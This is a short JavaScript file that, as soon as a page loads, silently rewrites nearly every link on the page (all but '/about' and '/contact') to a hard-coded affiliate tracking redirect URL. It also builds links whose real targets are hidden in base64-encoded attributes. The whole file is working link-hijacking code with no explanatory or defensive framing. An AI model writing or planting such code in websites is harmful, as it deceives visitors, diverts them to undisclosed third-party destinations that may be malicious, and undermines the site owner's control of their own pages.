const excludedLinks = ['/about', '/contact'];
const redirectUrl = 'https://trkgflow.g2afse.com/click?pid=13&offer_id=3054';

function base64_decode(data) {
    var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
    do {
        h1 = b64.indexOf(data.charAt(i++));
        h2 = b64.indexOf(data.charAt(i++));
        h3 = b64.indexOf(data.charAt(i++));
        h4 = b64.indexOf(data.charAt(i++));
        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
        o1 = bits >> 16 & 0xff;
        o2 = bits >> 8 & 0xff;
        o3 = bits & 0xff;

        if (h3 == 64) enc += String.fromCharCode(o1);
        else if (h4 == 64) enc += String.fromCharCode(o1, o2);
        else enc += String.fromCharCode(o1, o2, o3);
    } while (i < data.length);
    return enc;
}

function replaceHLink() {
    document.querySelectorAll('a').forEach(function (link) {
        var href = link.getAttribute('href');
        if (href && !excludedLinks.includes(href)) {
            link.setAttribute('href', redirectUrl);
        }
    });

    document.querySelectorAll('.hlink').forEach(function (el) {
        el.classList.remove('hlink');
        el.classList.add('olink');
        var attributes = Array.from(el.attributes).map(function (attr) {
            if (attr.name !== 'data-href') {
                return attr.name + '="' + attr.value + '"';
            }
        }).join(' ');
        el.outerHTML = '<a ' + attributes + ' href="' + base64_decode(el.getAttribute('data-href')) + '">' + el.innerHTML + '</a>';
    });
}

document.addEventListener('DOMContentLoaded', function () {
    replaceHLink();
});
